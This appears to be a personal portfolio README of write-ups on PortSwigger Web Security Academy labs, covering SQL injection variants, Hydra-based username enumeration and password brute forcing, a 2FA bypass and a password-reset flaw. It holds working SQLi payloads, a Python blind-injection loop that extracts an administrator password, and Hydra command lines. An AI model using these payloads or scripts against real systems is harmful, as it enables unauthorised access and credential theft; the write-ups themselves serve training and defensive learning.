# Cybersecurity-Writeups
Personal cybersecurity portfolio with detailed write-ups on PortSwigger SQLi labs and future challenges

# Lab 1: SQL Injection – Retrieve Hidden Data

## Objective
Demonstrate how SQL injection can be used to extract hidden information from a vulnerable application.

## Steps Taken
- Navigated to the vulnerable page and identified input fields.
- Tested with basic SQL injection payloads.
- Observed how the application responded to injected queries.
- Used `' OR '1'='1' --` to manipulate the query and reveal hidden data.

## Key Payloads
```sql
' OR '1'='1' --









---

##📄 Lab 2: SQL Injection – Login Bypass
```
# Lab 2: SQL Injection – Login Bypass

## Objective
Show how SQL injection can bypass authentication mechanisms in a login form.

## Steps Taken
- Navigated to the login page.
- Entered test credentials to observe normal behavior.
- Injected SQL payloads into the username field.
- Used `' OR '1'='1' --` to bypass authentication.

## Key Payloads
```sql
' OR '1'='1' --




---
##📄 Lab 3: SQL Injection – UNION Attack 
```

# Lab 3: SQL Injection – UNION Attack (Column Count Discovery)

## Objective
Use the UNION operator to determine the number of columns in the query and prepare for data extraction.

## Steps Taken
- Identified a vulnerable parameter in the product category filter.
- Injected `' UNION SELECT NULL--` to test column compatibility.
- Incrementally added `NULL` values until the query executed successfully.
- Confirmed the number of columns required for a valid UNION SELECT.

## Key Payloads
```sql
' UNION SELECT NULL,NULL--





---

### 📄 Lab 4: SQL Injection – UNION Attack with String Data
```
# Lab 4: SQL Injection – UNION Attack with String Data

## Objective
Demonstrate how to use UNION SELECT with string values to identify which columns can display extracted data.

## Steps Taken
- Used the column count discovered in Lab 3.
- Injected string values into each column to test which ones are reflected in the application output.
- Example: `' UNION SELECT 'abc','def'--`
- Observed which string appeared on the page, confirming the display column.
- Prepared to use that column for extracting sensitive data.

## Key Payloads
```sql
' UNION SELECT 'abc','def'--


### 📄 Lab 5: SQL Injection – UNION attack, retrieving data from other tables
```
### 🧪 Lab 05: SQL injection UNION attack, retrieving data from other tables

- **Category:** SQL Injection (UNION Attacks)
- **Difficulty:** Practitioner 🟢
- **Status:** Completed ✅

#### 🎯 Objective
Retrieve sensitive data (usernames and passwords) from a separate database table (`users`) and log in as the administrator user.

#### 💡 Key Concept Learned
* **Cross-Table Querying:** Using a `UNION` attack to access arbitrary tables within the database schema, provided you map out the matching column numbers and data types of the original query.

#### 🛠️ Exploit Methodology
1. **Determine Column Count:**
   Used `ORDER BY` clauses to find the column limit. Discovered the query returns 2 columns.
2. **Verify Text Support:**
   Tested if both columns accept string data:
   ```sql
   ' UNION SELECT 'a', 'b'--
   ```
3. **Extract Credentials:**
   Targeted the `users` table to pull the `username` and `password` columns directly into the visible product grid:
   ```sql
   ' UNION SELECT username, password FROM users--
   ```
4. **Takeover:** Located the `administrator` account credentials in the server response and successfully authenticated.

---






### 🧪 Lab 06: SQL injection UNION attack, retrieving multiple values in a single column

- **Category:** SQL Injection (UNION Attacks)
- **Difficulty:** Practitioner 🟢
- **Status:** Completed ✅

#### 🎯 Objective
Bypass data type restrictions where only a single column supports text data, yet multiple fields of information (username and password) must be retrieved.

#### 💡 Key Concept Learned
* **String Concatenation:** When a query limits the number of visible text fields, you can combine multiple data fields into a single string using a custom delimiter character (like `~`) to bypass the column restriction.

#### 🛠️ Exploit Methodology
1. **Identify Single-Column Text Restriction:**
   Discovered that while the query returned 2 columns, only one of them would allow string injection without triggering a database error (`200 OK` on only one side).
2. **Concatenate and Dump:**
   Used the database's string concatenation operator (`||`) to merge the distinct credentials into the single text-compatible column slot:
   ```sql
   ' UNION SELECT NULL, username || '~' || password FROM users--
   ```
3. **Takeover:** Parsed out the administrator's password from the joined `username~password` format string in the HTML output and logged in.

---







### 📄 Lab 07: SQL Injection attack, querying the database type and version on oracle
```
### 🧪 Lab 07: SQL injection attack, querying the database type and version on Oracle

- **Category:** SQL Injection (Examining the Database)
- **Difficulty:** Practitioner 🟢
- **Status:** Completed ✅

#### 🎯 Objective
Identify the database type and version of an Oracle-backed web application by injecting a `UNION` attack vector.

#### 💡 Key Concept Learned
Oracle databases have strict syntax rules that differentiate them from MySQL or PostgreSQL:
1. **The `FROM` Requirement:** Every `SELECT` query must include a `FROM` clause. To select constants or test columns, Oracle provides a built-in dummy table named `DUAL`.
2. **Version Tracking:** System banners and software version information are kept inside the `v$version` table under the `banner` column.

#### 🛠️ Exploit Methodology
1. **Determine Column Count & Types:** 
   Discovered that the database returns 2 columns, both of which accept string data:
   ```sql
   ' UNION SELECT 'a', 'a' FROM dual--
   ```

2. **Extract Database Version:** 
   Queried the Oracle system table to reflect the version banner string onto the page:
   ```sql
   ' UNION SELECT banner, NULL FROM v\$version--
   ```

---







### 🧪 Lab 08: SQL injection attack, querying the database type and version on MySQL and Microsoft

- **Category:** SQL Injection (Examining the Database)
- **Difficulty:** Practitioner 🟢
- **Status:** Completed ✅

#### 🎯 Objective
Identify the database type and version of a backend system running either MySQL or Microsoft SQL Server (MSSQL) using a `UNION` attack vector.

#### 💡 Key Concept Learned
* **Non-Strict FROM Clauses:** Neither MySQL nor MSSQL requires a dummy table (like Oracle's `DUAL`) to execute standalone `SELECT` constants.
* **MySQL Comment Handling:** MySQL requires an explicit space after a double-dash (`-- `) or a hash symbol (`#`). Using `#` (URL encoded as `%23`) avoids character stripping issues inside HTTP parameters.
* **Version Identification:** Both SQL engines leverage the `@@version` global variable to retrieve product and environment release banners.

#### 🛠️ Exploit Methodology
1. **Determine Column Count:**
   Injected a trailing hash comment structure to check system processing boundaries, finding exactly 2 columns:
   ```sql
   ' ORDER BY 2#
   ```
2. **Verify Text Support:**
   Tested structural compatibility by passing placeholder string data to both returned index channels:
   ```sql
   ' UNION SELECT 'abc', 'xyz'#
   ```
3. **Query Database Version:**
   Called the built-in system variable across a text-compatible column to parse out the deployment framework properties directly onto the webpage content layout:
   ```sql
   ' UNION SELECT @@version, NULL#
   ```

---


# 🛡️ PortSwigger Web Security Academy: Blind SQLi with Conditional Errors

## 📝 Lab Description
This lab contains a blind SQL injection vulnerability where the application uses a tracking cookie (`TrackingId`) to determine session behavior. The backend database uses **Oracle**, and the application does not return SQL errors or distinct changes in the response text when a query fails or succeeds normally. Instead, conditional errors must be forced inside the database to determine boolean truths based on **HTTP Status Codes**.

* **Objective:** Extract the 20-character alphanumeric password for the `administrator` user and log in.
* **Database Engine:** Oracle

---

## 🚀 Exploitation Methodology

### 1. Manual Verification (Fingerprinting)
By intercepting requests via **Burp Suite**, I verified that injecting an invalid Oracle mathematical operation inside a conditional statement forces an internal database exception, resulting in an **HTTP 500 Internal Server Error**:
* **True Condition (HTTP 500):** `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
* **False Condition (HTTP 200 OK):** `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

### 2. Automation via Custom Python Script
To scale the exploit efficiently without hammering a standard intruder tool, I developed a custom Python multi-character tracking script utilizing the `requests` library. 

The script targeted individual character indices using Oracle's `SUBSTR` function, monitored the specific response status codes, and appended valid matches sequentially when an HTTP 500 was registered.

```python
# Core logic snippet used for the automated character extraction loop:
for position in range(1, 21):
    for char in CHARSET:
        payload = f"{TRACKING_ID}'||(SELECT CASE WHEN (SUBSTR(password,{position},1)='{char}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        
        status_code = make_request(payload)
        
        if status_code == 500:
            extracted_password += char
            break
```

---

## 🏆 Key Takeaways & Skills Learned
* **Oracle SQL Syntax Mechanics:** Mastered string concatenation (`||`) and conditional statement syntax (`CASE WHEN ... THEN ... ELSE ... END`) native to Oracle infrastructure.
* **Error-Based Logic:** Leveraged intentional database execution failures (`TO_CHAR(1/0)`) to extract information without any visible data reflections or application-level output differences.
* **Script Optimization & Troubleshooting:** Resolved structural Python string anomalies, managed active session state variables, and accounted for uppercase variations inside automated loops.



# 🛡️ PortSwigger Web Security Academy: Visible Error-Based SQL Injection

## 📝 Lab Description
This lab contains a visible SQL injection vulnerability within the tracking cookie (`TrackingId`) infrastructure. The backend application uses a **PostgreSQL** database engine. Unlike blind injection vulnerabilities that require iterative guessing, this application natively returns verbose database error messages directly within the HTML body layout. By intentionally forcing a data type conversion failure, sensitive data can be directly extracted via backend error logs.

* **Objective:** Leak and extract the alphanumeric password for the `administrator` user account and log in.
* **Database Engine:** PostgreSQL

---

## 🚀 Exploitation Methodology

### 1. Identifying the Error Leak Context
By supplying invalid subqueries within the parameter, I observed that the application catches database exceptions but prints out structured, verbose PostgreSQL engine details on the front-end layout:
* **Payload Structure:** `TrackingId=' AND 1=CAST((SELECT 1) AS int)--`

### 2. Overcoming Character Limit Truncation
During manual exploitation via **Burp Suite Repeater**, long payload strings combined with original alphanumeric tracking values were getting cut off (truncated) by front-end input size constraints. This chopped off the vital SQL comments (`--`), breaking the query logic before it hit the database.

* **The Fix:** I completely wiped out the original tracking ID alphanumeric token string to optimize character spacing, freeing up real estate for the comment delimiters.

### 3. Forcing Data Type Mismatch (The Exploit)
By wrapping the text-based password query inside a structural `CAST(... AS int)` operation, PostgreSQL evaluates the logical condition but fails fatally when trying to turn an alphanumeric password string into an integer. 

```http
Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

### 4. Reading the Data Exfiltration Payload
Upon sending the minimized request, the application crashed safely and reflected the data directly into the error payload output pane:

> `An error occurred: invalid input syntax for type integer: "p4ssw0rd_h3r3_abc123"`

---

## 🏆 Key Takeaways & Skills Learned
* **Verbose Error Exploitation:** Mastered abusing descriptive data type casting mechanisms (`CAST()`) to read inline row parameters out of structural database exceptions.
* **Evasion & Input Constraints:** Diagnosed and bypassed structural request length filtering (character truncation limits) by modifying and condensing parameter payloads.
* **Database Target Analysis:** Analyzed response layouts to quickly pivot inputs based on specific target constraints (PostgreSQL structures vs. Oracle structures).



# 🛡️ PortSwigger Web Security Academy: Blind SQL Injection with Time Delays

## 📝 Lab Description
This lab contains a blind SQL injection vulnerability within the tracking cookie (`TrackingId`) infrastructure. The backend database uses a **PostgreSQL** engine. Unlike previous labs, the application does not return any visible database errors or changes in the page text when a query succeeds or fails. To verify and exploit the vulnerability, conditional time-based logic must be injected to force the database to pause execution before responding to the network client.

* **Objective:** Exploit the blind SQL injection vulnerability to trigger an intentional 10-second delay.
* **Database Engine:** PostgreSQL

---

## 🚀 Exploitation Methodology

### 1. Identifying Time-Based Blind Logic
Because the application processes input silently, I injected a database sleep statement (`pg_sleep()`) native to PostgreSQL into the cookie header parameter to check for execution control. 

* **The Test Payload:**
  ```http
  Cookie: TrackingId=x'; SELECT pg_sleep(10)--
  ```
By monitoring the network response metrics inside **Burp Suite Repeater**, I verified the vulnerability when the application backend hung for exactly **10,000 milliseconds (10 seconds)** before closing the connection.

### 2. Live Session Injection (The Solution)
While a custom Python automation script can be written to extract granular table text character-by-character using time differentials, the specific clearance criteria for this environment required triggering the 10-second infrastructure delay natively on an active, authenticated browser thread.

Using **Burp Suite Intercept**, I caught a live browser request and appended the PostgreSQL concatenation sleep sequence cleanly inside the active tracking parameter string:

```http
Cookie: TrackingId=LIVE_TOKEN_STRING' || pg_sleep(10)--; session=LIVE_SESSION_STRING
```

Forwarding this request caused the front-end browser tab to spin for 10 seconds while the database executed the sleep command, completing the validation challenge.

---

## 🏆 Key Takeaways & Skills Learned
* **Time-Based Inference Controls:** Mastered testing for hidden injection flaws where data reflections and error outputs are completely suppressed by checking response latency.
* **Database Engine Profiling:** Utilized PostgreSQL specific timing operators (`pg_sleep`) to achieve execution confirmation.
* **Session Synced Verification:** Learned the importance of aligning exploit actions with active browser session tracking headers rather than isolated sandbox tokens.





# 🛡️ PortSwigger Web Security Academy: Username Enumeration via Different Responses

## 📝 Lab Description
This lab contains an authentication vulnerability in its login mechanism. Because the application returns distinct error messages depending on whether a username exists (`Invalid username` vs. `Incorrect password`), an attacker can enumerate valid user accounts before launching a targeted credential brute-force attack.

* **Objective:** Enumerate a valid username, brute-force the corresponding password, and log into the account.
* **Tools Used:** THC-Hydra, Kali Linux, Burp Suite

---

## 🚀 Exploitation Methodology

### 1. Analyzing Login Error Responses
By testing invalid credentials on the `/login` endpoint, I identified two distinct front-end error states:
* **Unknown Username:** Returns `Invalid username`
* **Valid Username / Wrong Password:** Returns `Incorrect password`

### 2. Username Enumeration with THC-Hydra
Instead of relying on rate-limited community proxy tools, I loaded PortSwigger's candidate username wordlist (`usernames.txt`) into **THC-Hydra** over HTTPS (`https-post-form`). By filtering out responses containing `Invalid username`, Hydra isolated the single valid user account:

```bash
hydra -L usernames.txt -p password123 -t 16 <LAB-ID>.web-security-academy.net https-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username"
```

* **Enumerated Username:** `application`

### 3. Password Brute-Forcing
With a confirmed target username (`application`), I reversed the Hydra attack using the candidate password wordlist (`passwords.txt`) and adjusted the failure filter to ignore `Incorrect password` responses:

```bash
hydra -l application -P passwords.txt -t 16 <LAB-ID>.web-security-academy.net https-post-form "/login:username=^USER^&password=^PASS^:F=Incorrect password"
```

### 4. Account Access
Using the cracked credentials (`application` and the extracted password), I authenticated via the `/login` portal and completed the lab.

---

## 🏆 Key Takeaways & Remediation
* **Vulnerability Root Cause:** Verbose authentication feedback leaks account existence, cutting attacker brute-force effort in half.
* **Secure Fix:** Always return generic, identical error messages (e.g., *"Invalid username or password"*) and uniform HTTP responses for all failed login attempts, paired with rate-limiting or account lockout controls.





# 🛡️ PortSwigger Web Security Academy: 2FA Simple Bypass

## 📝 Lab Description
This lab's two-factor authentication (2FA) mechanism is vulnerable to forced browsing. While the application prompts for a verification code after valid primary credentials are submitted, it fails to verify whether the 2FA step was actually completed before granting access to authenticated pages.

* **Objective:** Bypass the 2FA verification step and access the victim's account page (`carlos`).
* **Credentials Used:** `carlos:montoya`

---

## 🚀 Exploitation Methodology

### 1. Primary Authentication
I navigated to the login portal and submitted the victim's known username and password (`carlos:montoya`). Upon submission, the application issued an authenticated session cookie and redirected the browser to `/login2` to request a 6-digit verification code.

### 2. Forced Browsing Bypass
Instead of interacting with the 2FA form, I manually modified the URL path in the browser address bar from `/login2` directly to `/my-account`:

```http
GET /my-account HTTP/2
```

Because the backend session state was already elevated upon primary login without enforcing a secondary verification flag, the server rendered `carlos`'s account dashboard directly.

---

## 🏆 Key Takeaways
* **State Enforcement:** Multi-factor authentication must enforce a strict state machine on the server side—users should remain in a temporary, unprivileged pre-auth state until all required authentication factors are verified.




# 🛡️ PortSwigger Web Security Academy: Password Reset Broken Logic

## 📝 Lab Description
This lab's password reset functionality contains a broken logic flaw. While the application generates a valid reset token and sends it to the requesting user's email, the backend fails to verify whether the reset token actually belongs to the user whose password is being changed during the final submission step.

* **Objective:** Reset `carlos`'s password and log in to his account.
* **Known Credentials:** `wiener:peter`

---

## 🚀 Exploitation Methodology

### 1. Requesting a Valid Password Reset Token
I navigated to the **Forgot password?** page and submitted a password reset request for my own account (`wiener`). Opening the **Email client** revealed a password reset link containing a valid, single-use `temp-forgot-password-token` parameter.

### 2. Intercepting and Tampering with the Reset Request
After clicking the reset link and entering a new password, I intercepted the resulting `POST /forgot-password` request in **Burp Suite Proxy**:

```http
POST /forgot-password?temp-forgot-password-token=VALID_TOKEN HTTP/2
Host: <LAB-ID>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=VALID_TOKEN&username=wiener&new-password-1=password&new-password-2=password
```

Because the server trusts the `username` parameter in the request body without binding it to the `temp-forgot-password-token`, I modified `username=wiener` to `username=carlos` and forwarded the request.

### 3. Account Takeover
The backend validated my token and applied the new password (`password`) directly to `carlos`'s account. I navigated to `/login` and authenticated as `carlos:password` to solve the lab.

---

## 🏆 Key Takeaways
* **Token-to-User Binding:** Password reset tokens must be cryptographically or relationally tied to a specific user ID on the server side—the backend should never rely on a user-supplied `username` field during the final reset step.
* **Parameter Tampering:** Always inspect hidden or pre-filled form fields in multi-step workflows (like password resets) to verify whether user identifiers can be swapped.

















